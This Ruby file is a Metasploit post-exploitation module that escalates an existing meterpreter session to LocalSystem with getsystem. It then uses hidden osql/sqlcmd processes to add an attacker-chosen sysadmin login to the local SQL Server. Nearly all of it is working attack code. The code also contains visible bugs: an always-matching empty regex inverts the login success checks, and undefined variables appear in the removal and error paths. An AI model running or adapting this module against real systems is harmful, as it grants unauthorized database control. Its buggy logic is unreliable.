require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'

class Metasploit3 < Msf::Post

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'SQL Server - Local Authorization Bypass',
				'Description'   => %q{ When this module is executed via an existing 
				meterpreter session it can used to gain unauthorized access to local 
				SQL Server instances.  It first obtains LocalSystem privileges 
				using the "getsystem" escalation methods. Then, it adds a sysadmin 
				login to the local SQL Server using native SQL clients and stored
				procedures.  
				
				This is possible because LocalSystem has syadmin privileges in all 
				versions of SQL Server (2k8 and prior) by default in order to manage 
				SQL Server patches.  This may also work on SQL 2012, but I haven't
				tested it yet.},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Scott Sutherland <scott.sutherland@netspi.com>'],
				'Platform'      => [ 'Windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))

		register_options(
			[
				OptString.new('DB_USERNAME',  [true, 'New sysadmin login', '']),
				OptString.new('DB_PASSWORD',  [true, 'Password for new sysadmin login', '']),
				OptBool.new('VERBOSE',  [false, 'Set how verbose the output should be', '']),
			], self.class)
	end
	
	# TODO
	# - forward sql server error message to output

	def run
			
		# Set Verbosity level
		verbose = datastore['verbose'].to_s.downcase 
		
		# Display target
		print_status("Running module against #{sysinfo['Computer']}")	
	
		##
		## Add NEW SYSADMIN
		##
		
		# Get LocalSystem privileges		
		print_status("Attempting to obtain LocalSystem privileges...") if verbose == "true"
		system_status = session.priv.getsystem
		if system_status[0]			
			print_good("Obtained LocalSystem privileges")
			
			# Check if a SQL Server service is running
			print_status("Checking for SQL Server...") if verbose == "true"
			sqlinstance = check_for_sqlserver()			
			if sqlinstance != 0
								
				# Identify available native SQL client
				print_status("Checking for native client...") if verbose == "true"
				sql_client = get_sql_client()				
				if sql_client != 0
					
					# Add new login
					print_status("Attempting to add new login #{datastore['DB_USERNAME']}...") if verbose == "true"
					add_login_status = add_sql_login(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],verbose)
					if add_login_status == 1
						
						# Add login to sysadmin fixed server role
						print_status("Attempting to make #{datastore['DB_USERNAME']} login a sysadmin...") if verbose == "true"
						add_sysadmin(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],verbose)
						
					end
				end
			end
		else
			print_error("Could not obtain LocalSystem privileges")
		end
		
	end
	
	
	# Method to check if the SQL Server service is running
	def check_for_sqlserver
	
		# Get Data
		running_services = run_cmd("net start")	
		
		# Parse Data
		services_array = running_services.split("\n")		
		
		# Check for the SQL Server service
		services_array.each do |service|
			if service =~ /SQL Server \(| MSSQLSERVER/ then 
				
				# Display local instance
				instance = service.gsub(/SQL Server \(/, "").gsub(/\)/, "").lstrip.rstrip
				print_good("SQL Server service instance found: #{instance}")				
				return 1
			end
		end		
		
		# Fail
		print_error("SQL Server instance NOT found")		
		return 0
	end

	# Method for identifying which SQL client to use
	def get_sql_client
	
		# Get Data - osql
		running_services1 = run_cmd("osql -?")	
		
		# Parse Data - osql
		services_array1 = running_services1.split("\n")
		
		# Check for osql
		services_array1.each do |service1|
			if service1 =~ /SQL Server Command Line Tool/ then 
				print_good("OSQL client is available")
				return "osql"
			end
		end				
		
		# Get Data - sqlcmd
		running_services = run_cmd("sqlcmd -?")			
		
		# Parse Data - sqlcmd
		services_array = running_services.split("\n")
		
		# Check for SQLCMD
		services_array.each do |service|
			if service =~ /SQL Server Command Line Tool/ then 
				print_good("SQLCMD client is available")
				return "sqlcmd"
			end
		end		
		
		# Fail
		print_error("No native SQL client available")
		return 0
	end

	# Method for adding a login
	def add_sql_login(sqlclient,dbuser,dbpass,verbose)
		
		# Display debugging information
		print_status("Settings:") if verbose == "true" 
		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
		print_status(" o User: #{dbuser}") if verbose == "true" 
		print_status(" o Password:  #{dbpass}") if verbose == "true"  		
		print_status("Command:") if verbose == "true" 
		print_status("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\"") if verbose == "true" 
		
		# Get Data
		add_login_result = run_cmd("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\"")
		
		# Parse Data 
		add_login_array = add_login_result.split("\n")
		
		# Check for success
		check = 0
		add_login_array.each do |service|
			if service =~ // then
					check = 1
			end
		end	
		
		if check == 0	
		
			print_good("Successfully added login \"#{dbuser}\" with password \"#{dbpass}\"")	
			return 1
			
		else 
		
			# Fail
			print_error("Unabled to add login #{dbuser}")
			print_error("Database Error:\n #{add_login_result}")
			return 0
			
		end

	end
	
	# Method for adding a login to sysadmin role
	def add_sysadmin(sqlclient,dbuser,dbpass,verbose)
	
		# Display debugging information
		print_status("Settings:") if verbose == "true" 
		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
		print_status(" o User: #{dbuser}") if verbose == "true" 
		print_status(" o Password:  #{dbpass}") if verbose == "true"  
		print_status("Command:")  if verbose == "true" 
		print_status("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \"") if verbose == "true" 
		
		# Get Data
		add_sysadmin_result = run_cmd("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \"")
		
		# Parse Data 
		add_sysadmin_array = add_sysadmin_result.split("\n")
		
		# Check for success
		check = 0
		add_sysadmin_array.each do |service|
			if service =~ /bingo/ then
					check = 1
			end
		end	
		
		if check == 1		
		
			print_good("Successfully added #{dbuser} to sysadmin role")
			return 1
			
		else 
		
			# Fail
			print_error("Unabled to add #{dbuser} to sysadmin role")
			print_error("Database Error:\n #{add_login_result}")
			return 0
			
		end
	end
	
	# Method for removing login
	def remove_sql_login(sqlclient,dbuser,verbose)
		
		# Display debugging information
		print_status("Settings:") if verbose == "true" 
		print_status(" o SQL Client: #{sqlclient}") if verbose == "true" 
		print_status(" o User: #{dbuser}") if verbose == "true" 			
		print_status("Command:") if verbose == "true" 
		print_status("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_droplogin '#{dbuser}'\"") if verbose == "true" 
		
		# Get Data
		remove_login_result = run_cmd("#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_droplogin '#{dbuser}'\"")
		
		# Parse Data 
		add_remove_array = add_remove_result.split("\n")
		
		# Check for success
		check = 0
		add_remove_array.each do |service|
			if service =~ // then
					check = 1
			end
		end	
		
		if check == 0	
		
			print_good("Successfully removed login \"#{dbuser}\"")	
			return 1
			
		else 
		
			# Fail
			print_error("Unabled to remove login #{dbuser}")
			print_error("Database Error:\n #{add_login_result}")
			return 0
			
		end

	end
		
	# Method for executing cmd and returning the response
	# Note: This is from one of Jabra's modules - Thanks man!
	# Warning: This doesn't want to work for me on Win2k systems.
	def run_cmd(cmd,token=true)
		opts = {'Hidden' => true, 'Channelized' => true, 'UseThreadToken' => token}
		process = session.sys.process.execute(cmd, nil, opts)
		res = ""
		while (d = process.channel.read)
			break if d == ""
			res << d
		end
		process.channel.close
		process.close
		return res
	end
end

